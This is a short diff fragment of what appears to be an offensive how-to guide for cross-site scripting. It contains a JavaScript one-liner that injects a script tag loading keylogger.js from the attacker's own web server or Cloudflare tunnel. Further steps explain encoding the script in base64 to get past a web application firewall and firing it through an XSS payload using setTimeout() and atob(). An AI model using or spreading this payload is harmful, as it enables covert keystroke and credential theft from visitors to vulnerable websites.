@@ -4,7 +4,6 @@
 
 - var a=document.createElement("script");a.src="https://[your webserver or cloudflare tunnel]/keylogger.js";document.body.appendChild(a);
 </br>
-
 4. Make this js to base64 for waf bypass
 
 5. Add this to your xss payload with setTimeout() and atob()
